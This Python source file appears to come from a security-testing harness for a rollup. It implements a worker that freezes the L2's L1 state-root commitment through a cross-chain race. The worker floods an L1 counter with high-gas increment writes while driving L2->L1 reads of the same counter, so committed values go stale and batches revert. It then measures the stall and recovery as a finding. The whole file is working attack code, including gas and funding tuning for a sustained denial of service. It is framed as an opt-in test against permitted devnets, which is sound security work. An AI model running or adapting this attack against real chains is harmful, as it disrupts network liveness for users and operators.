"""State-root race worker — a cross-chain liveness DoS against the L2.

The attack (per the EEZ synchronous model)
-------------------------------------------
When the composer builds an L2 block containing an L2->L1 call, it must
SPECULATE that call's L1 return value and commit it into the block's rolling
hash.  The batch is only valid if, when `postAndVerifyBatch` re-executes those
calls on L1, every return value still matches the committed one
(`EEZ.sol::_executeEntry` reverts with `RollingHashMismatch` otherwise).

So an attacker who can change the L1 state that a committed call reads, *after*
the L2 block is built but *before* the batch lands, makes the batch unpostable:

  * drive a steady stream of L2->L1 calls that READ an L1 `counter()` — the
    committed return value is an exact number, so *any* concurrent write breaks
    it (a read is a sharper weapon than a racing `increment()`, whose result is
    more forgiving);
  * in parallel, hammer that same counter with high-gas L1 `increment()` writes
    so the value the composer committed is already stale by batch-execution time.

The L2 keeps producing blocks, but its L1 attestation freezes: no new
`postAndVerifyBatch` lands, `last L1 state root` ages without bound, and
`uncommitted` grows.  Observed on devnet-7331: state-root age climbed 5s -> 200s
across a 200s burst and recovered within minutes of release.

Why this is default-disabled
----------------------------
Blocking L1 commitment starves *every other worker* of liveness, so this is not
a background probe — it is a deliberate, isolated attack run.  Enable it alone
(`workers.stateroot_race.enabled: true`) on an instance you are allowed to DoS.

Why it releases and re-checks recovery
--------------------------------------
A stalled state root, on its own, is not proof of *our* attack — the composer
also stalls on its own (68-76 min ambient stalls were seen on chiado-6290).  So
each round measures the causal signature, not just the symptom: it attacks for
`attack_seconds`, records the max state-root age reached under load, then RELEASES
and watches for `cooldown_seconds`.  A finding is only raised when the chain both
stalled under attack AND recovered after release — the fingerprint of a caused
DoS rather than an ambient one.

Everything here is single-hop: the L2->L1 leg is one `call_l1_from_l2` onto a
plain L1 `Counter`, never a nested cross-chain action.
"""
from __future__ import annotations

import threading
import time
from typing import Any

from eth_utils import keccak

from .base import Worker

# postAndVerifyBatch selector — a tx to the registry with this prefix is a
# state-root commit.  Its recency is the liveness signal we attack.
POST_BATCH_SELECTOR = "0x8b1a095a"


class StateRootRaceWorker(Worker):
    name = "stateroot_race"
    description = "Race L1 writes against committed L2->L1 reads to freeze L2 commitment (liveness DoS)"

    # ── lifecycle ────────────────────────────────────────────────────────────
    def setup(self) -> None:
        # Attack shape.  Defaults are tuned to be FUND-EFFICIENT: a 500-gwei
        # 4-writes/s flood blocks the chain but burns ~7 ETH/min, so it self-
        # terminates on funds long before 10 min.  ~1.4 writes/s at 100 gwei
        # (still ~10x the batch poster's price) is enough to keep every committed
        # read stale while costing ~0.4 ETH/min.
        self.attack_seconds = float(self.wcfg.get("attack_seconds", 660))
        self.cooldown_seconds = float(self.wcfg.get("cooldown_seconds", 240))
        self.write_threads = int(self.wcfg.get("write_threads", 1))
        self.write_interval = float(self.wcfg.get("write_interval_seconds", 0.7))
        self.read_interval = float(self.wcfg.get("read_interval_seconds", 2.0))
        self.l1_write_gas = int(self.wcfg.get("l1_write_gas", 120_000))
        # Outbid the batch poster (which posts near the L1 base price) so our writes
        # land in the same/earlier block than any batch that reads the slot.
        self.write_gas_floor = int(self.wcfg.get("write_gas_floor_gwei", 100)) * 10**9
        self.write_gas_multiplier = int(self.wcfg.get("write_gas_multiplier", 10))
        # Only claim a confirmed >=N-minute DoS once the block is sustained this long.
        self.min_block_seconds = float(self.wcfg.get("min_block_seconds", 600))
        # Warn if the attacker's L1 balance falls below this — the flood dies (and
        # the chain recovers) on funds, not on our release, which would otherwise
        # look like a false "recovered" result.
        self.l1_balance_floor = float(self.wcfg.get("l1_balance_floor_eth", 1.0)) * 10**18
        # State-root age (seconds) above which we call the L2 "commitment blocked".
        self.block_threshold = float(self.wcfg.get("block_threshold_seconds", 90))
        # How far back to scan L1 for the last batch — must exceed a full attack's
        # worth of blocks (attack_seconds / l1_block_time) so a long stall is still
        # measurable, not lost past the window.
        self.scan_lookback = int(self.wcfg.get("scan_lookback_blocks", 700))
        self.xgas = self.cfg.eez.crosschain_gas_limit
        self.registry = self.cfg.eez.registry.lower()

        self.counter: str | None = None
        self.art = self.ctx.contracts.get("Counter")
        self._read_calldata = "0x" + keccak(b"counter()").hex()[:8]
        self._inc_calldata = self.art.encode_call("increment")
        self._ready = False

        self.state.gauge("attack_seconds", self.attack_seconds)
        self.state.gauge("cooldown_seconds", self.cooldown_seconds)
        self.state.gauge("block_threshold_seconds", self.block_threshold)
        self.state.gauge("write_gas_floor_gwei", self.write_gas_floor // 10**9)

    def interval(self) -> float:
        # Between full attack->release cycles; the burst + cooldown already pace us.
        return float(self.wcfg.get("interval_seconds", 10))

    def step(self) -> None:
        if not self._prepare():
            return
        self._attack_cycle()

    # ── preparation ─────────────────────────────────────────────────────────
    def _prepare(self) -> bool:
        """Deploy the contested L1 Counter and confirm the L2->L1 path works."""
        if self._ready:
            return True

        if self.counter is None:
            try:
                dep = self.ctx.contracts.deploy(self.ctx.l1, "Counter", side="l1")
            except Exception as exc:  # noqa: BLE001
                self.state.incr("deploy_send_errors")
                self.state.log(f"Counter deploy send failed: {exc}", "warn")
                return False
            rcpt = self.ctx.l1.wait_receipt(dep.tx_hash, timeout=180)
            if rcpt is None or not rcpt.ok or not self.ctx.l1.has_code(dep.address):
                self.state.incr("deploy_failed")
                self.state.log(f"Counter deploy {dep.tx_hash} produced no code", "warn")
                return False
            self.counter = dep.address
            self.state.gauge("counter_l1", dep.address)
            self.state.log(f"contested Counter at {dep.address} (L1)")

        # The L2->L1 leg is paid from the funding key's L2 balance.
        try:
            l2_bal = self.ctx.l2.balance(self.ctx.l2.address)
        except Exception as exc:  # noqa: BLE001
            self.state.log(f"L2 balance read failed: {exc}", "warn")
            return False
        if l2_bal <= 0:
            self.state.incr("waiting_for_l2_balance")
            self.state.log("funding account has no L2 balance yet — backing off", "warn")
            return False

        # One clean L2->L1 read to confirm the outbound proxy exists and the path
        # settles before we start racing it.
        try:
            h, ref = self.ctx.eez.call_l1_from_l2(self.counter, self._read_calldata, gas=self.xgas)
            self.state.gauge("outbound_proxy", ref.proxy_address)
            self.ctx.l2.wait_receipt(h, timeout=60)
        except Exception as exc:  # noqa: BLE001
            self.state.incr("baseline_errors")
            self.state.log(f"baseline L2->L1 read failed: {exc}", "warn")
            return False

        self._ready = True
        self.state.log("ready: Counter deployed, L2 balance present, L2->L1 path live")
        return True

    # ── the attack ────────────────────────────────────────────────────────────
    def _attack_cycle(self) -> None:
        base_age = self._state_root_age()
        if base_age is None:
            self.state.incr("age_read_failed")
            self.state.log("could not read state-root age; skipping round", "warn")
            return
        # Don't start an attack while the chain is already stalled — we could not
        # attribute the stall to ourselves, and the recovery check would be moot.
        if base_age > self.block_threshold:
            self.state.incr("skipped_prestalled")
            self.state.log(
                f"L2 commitment already stalled (state-root age {base_age:.0f}s) — "
                "waiting for it to recover before attacking",
                "warn",
            )
            self.sleep(self.cooldown_seconds)
            return

        stop = threading.Event()
        stats = {"l1_writes": 0, "l1_errors": 0, "l2_reads": 0, "l2_errors": 0}
        threads = [threading.Thread(target=self._hammer_l1, args=(stop, stats), daemon=True)
                   for _ in range(self.write_threads)]
        threads.append(threading.Thread(target=self._drive_l2_reads, args=(stop, stats), daemon=True))
        for t in threads:
            t.start()

        l2_head0 = self._l2_head()
        t0 = self.now()
        max_age = base_age
        blocked_at: float | None = None      # first crossing of the block threshold
        block_span = 0.0                     # longest CONTINUOUS span above threshold
        span_start: float | None = None
        flood_died_at: float | None = None   # writes stalled while attack still running
        low_funds = False
        prev_writes = 0
        prev_t = t0
        self.state.incr("attack_rounds")
        self.state.log(f"attack start: state-root age {base_age:.0f}s, L2 head {l2_head0}")

        # Always stop the flood, even if the measurement loop raises — a leaked
        # daemon thread would keep hammering L1 for the life of the process.
        try:
            while self.now() - t0 < self.attack_seconds and not self.stopping():
                self.sleep(20)
                now = self.now()
                age = self._state_root_age()
                # Write RATE since the last sample: a flood that has run out of
                # funds (or hit a nonce wall) keeps its thread alive but lands
                # nothing — and the chain then recovers on ITS OWN, which must not
                # be mistaken for our deliberate release.
                wrote = stats["l1_writes"] - prev_writes
                rate = wrote / max(1e-6, now - prev_t)
                prev_writes, prev_t = stats["l1_writes"], now
                bal = self._l1_balance()
                if bal is not None and bal < self.l1_balance_floor:
                    low_funds = True
                if flood_died_at is None and rate < 0.2 and now - t0 > 30:
                    flood_died_at = now - t0
                    self.state.log(
                        f"flood stalled at ~{flood_died_at:.0f}s (write rate {rate:.2f}/s, "
                        f"L1 balance {'?' if bal is None else f'{bal/1e18:.2f}'} ETH) — "
                        f"attack is fund/nonce limited, not released", "warn"
                    )
                if age is None:
                    continue
                max_age = max(max_age, age)
                if age > self.block_threshold:
                    if blocked_at is None:
                        blocked_at = now - t0
                    if span_start is None:
                        span_start = now
                    block_span = max(block_span, now - span_start)
                else:
                    span_start = None
                self.state.gauge("last_attack", {
                    "elapsed": round(now - t0),
                    "state_root_age": round(age),
                    "block_span": round(block_span),
                    "l2_head_delta": self._l2_head() - l2_head0,
                    "l1_writes": stats["l1_writes"],
                    "write_rate": round(rate, 2),
                    "l2_reads": stats["l2_reads"],
                    "blocked": age > self.block_threshold,
                })
                # No point burning the rest of the window once the flood is dead
                # and the chain has already recovered on its own.
                if flood_died_at is not None and age <= self.block_threshold:
                    break
        finally:
            stop.set()
            for t in threads:
                t.join(timeout=5)

        self.state.gauge("last_max_state_root_age", round(max_age))
        self.state.gauge("last_block_span", round(block_span))
        self.state.gauge("last_l1_writes", stats["l1_writes"])
        self.state.gauge("last_l2_reads", stats["l2_reads"])

        if self.stopping():
            return

        # ── classify the round ────────────────────────────────────────────────
        if max_age <= self.block_threshold:
            self.state.incr("attack_ineffective")
            self.state.log(
                f"attack did not block: max state-root age {max_age:.0f}s "
                f"(<= {self.block_threshold:.0f}s threshold) after {stats['l1_writes']} writes"
                + (" — flood never got funds/nonces to land" if flood_died_at is not None else ""),
                "warn",
            )
            self.sleep(self.cooldown_seconds)
            return

        # The flood self-terminated (funds/nonce) before we chose to release. It
        # DID block while it lasted, but this is not a sustained-DoS result and the
        # subsequent recovery is not attributable to our release — report it as
        # exactly that rather than as a clean confirmation.
        if flood_died_at is not None:
            self.state.incr("attack_unsustainable")
            self.state.finding(
                title="State-race blocks L2 commitment but flood is fund-limited",
                severity="med",
                detail=(
                    f"the race blocked L2 commitment for ~{block_span:.0f}s (state-root age up to "
                    f"{max_age:.0f}s) but the L1 write flood stalled at ~{flood_died_at:.0f}s"
                    + (" as the attacker's L1 balance fell below the floor" if low_funds else
                       " (funds/nonce exhausted)")
                    + f", after which the chain recovered on its own. The attack is real but "
                    f"needs more L1 funding (or lower per-write gas) to sustain the "
                    f"{self.min_block_seconds / 60:.0f}-minute target. {stats['l1_writes']} writes "
                    f"landed before it stalled."
                ),
                counter=self.counter,
                block_span=round(block_span),
                max_age=round(max_age),
                flood_died_at=round(flood_died_at),
                l1_writes=stats["l1_writes"],
            )
            self.state.log(
                f"blocked ~{block_span:.0f}s then flood died (fund-limited) at "
                f"~{flood_died_at:.0f}s — not a sustained DoS", "warn"
            )
            self.sleep(self.cooldown_seconds)
            return

        # Flood stayed healthy for the whole window and the chain stalled. Now the
        # causal test: release and watch it recover.
        recovered_after = self._await_recovery()

        if recovered_after is not None:
            sustained = block_span >= self.min_block_seconds
            self.state.incr("liveness_dos_confirmed" if sustained else "liveness_dos_partial")
            self.state.finding(
                title=(
                    f"Cross-chain state-race freezes L2 commitment for "
                    f"{'>=' if sustained else '~'}{block_span / 60:.0f} min (liveness DoS)"
                ),
                severity="high",
                detail=(
                    f"Driving L2->L1 reads of an L1 counter while flooding that counter with "
                    f"{self.write_gas_floor // 10**9}-gwei L1 writes froze the L2's L1 "
                    f"attestation for a continuous {block_span:.0f}s (state-root age {base_age:.0f}s "
                    f"-> {max_age:.0f}s"
                    + (f", crossing the {self.block_threshold:.0f}s threshold at ~{blocked_at:.0f}s"
                       if blocked_at is not None else "")
                    + f") while the L2 kept producing blocks. On release the chain recovered "
                    f"(age back under threshold ~{recovered_after:.0f}s later), confirming the "
                    f"stall was caused by the race, not an ambient composer stall. Batches revert "
                    f"on RollingHashMismatch when a committed L2->L1 read is invalidated by a "
                    f"concurrent L1 write. {stats['l1_writes']} writes / {stats['l2_reads']} "
                    f"L2->L1 reads fired."
                ),
                counter=self.counter,
                base_age=round(base_age),
                max_age=round(max_age),
                block_span=round(block_span),
                sustained_target_seconds=round(self.min_block_seconds),
                recovered_after_seconds=round(recovered_after),
                l1_writes=stats["l1_writes"],
                l2_reads=stats["l2_reads"],
            )
            self.state.log(
                f"LIVENESS DoS {'CONFIRMED' if sustained else 'shown'}: blocked "
                f"{block_span:.0f}s (age up to {max_age:.0f}s), recovered ~{recovered_after:.0f}s "
                f"after release", "error"
            )
        else:
            # Stalled under attack but did not recover after release within the
            # cooldown — could be a deeper stall (or an ambient one that began
            # mid-attack).  Report it, at lower confidence, rather than silently.
            self.state.incr("stalled_no_recovery")
            self.state.finding(
                title="L2 commitment stalled under state-race but did not recover on release",
                severity="med",
                detail=(
                    f"state-root age reached {max_age:.0f}s under the race and was still above "
                    f"{self.block_threshold:.0f}s {self.cooldown_seconds:.0f}s after release — "
                    f"either a deeper wedge or an ambient composer stall overlapping the attack; "
                    f"causation is unconfirmed"
                ),
                counter=self.counter,
                max_age=round(max_age),
            )
            self.state.log(
                f"stalled to {max_age:.0f}s but no recovery within {self.cooldown_seconds:.0f}s "
                "of release — causation unconfirmed", "warn"
            )

    def _hammer_l1(self, stop: threading.Event, stats: dict[str, int]) -> None:
        """Flood the L1 counter with high-gas increments so any committed read is stale."""
        try:
            gp = max(self.ctx.l1.gas_price() * self.write_gas_multiplier, self.write_gas_floor)
        except Exception:  # noqa: BLE001
            gp = self.write_gas_floor
        while not stop.is_set() and not self.stopping():
            try:
                self.ctx.l1.send(
                    to=self.counter,
                    data=self._inc_calldata,
                    gas=self.l1_write_gas,
                    gas_price=gp,
                    endpoint=self.cfg.l1.rpc,
                )
                stats["l1_writes"] += 1
            except Exception:  # noqa: BLE001 — send() rolls its own nonce back
                stats["l1_errors"] += 1
            stop.wait(self.write_interval)

    def _drive_l2_reads(self, stop: threading.Event, stats: dict[str, int]) -> None:
        """Keep feeding the composer L2->L1 reads whose committed value we invalidate."""
        while not stop.is_set() and not self.stopping():
            try:
                self.ctx.eez.call_l1_from_l2(self.counter, self._read_calldata, gas=self.xgas)
                stats["l2_reads"] += 1
            except Exception:  # noqa: BLE001
                stats["l2_errors"] += 1
            stop.wait(self.read_interval)

    def _await_recovery(self) -> float | None:
        """After releasing, return seconds until state-root age drops below the
        block threshold, or None if it never recovers within the cooldown."""
        t0 = self.now()
        while self.now() - t0 < self.cooldown_seconds and not self.stopping():
            age = self._state_root_age()
            if age is not None and age <= self.block_threshold:
                return self.now() - t0
            self.sleep(10)
        return None

    # ── liveness probe ─────────────────────────────────────────────────────────
    def _state_root_age(self) -> float | None:
        """Seconds since the newest postAndVerifyBatch tx to the registry on L1."""
        try:
            head = self.ctx.l1.block_number()
        except Exception:  # noqa: BLE001
            return None
        for bn in range(head, max(0, head - self.scan_lookback), -1):
            try:
                b = self.ctx.l1.call("eth_getBlockByNumber", [hex(bn), True])
            except Exception:  # noqa: BLE001
                continue
            if not b:
                continue
            for tx in b.get("transactions", []):
                if ((tx.get("to") or "").lower() == self.registry
                        and (tx.get("input") or "").startswith(POST_BATCH_SELECTOR)):
                    return time.time() - int(b["timestamp"], 16)
        return None  # no batch within the lookback window — unknown, not "fresh"

    def _l2_head(self) -> int:
        try:
            return self.ctx.l2.block_number()
        except Exception:  # noqa: BLE001
            return 0

    def _l1_balance(self) -> int | None:
        try:
            return self.ctx.l1.balance(self.ctx.l1.address)
        except Exception:  # noqa: BLE001
            return None
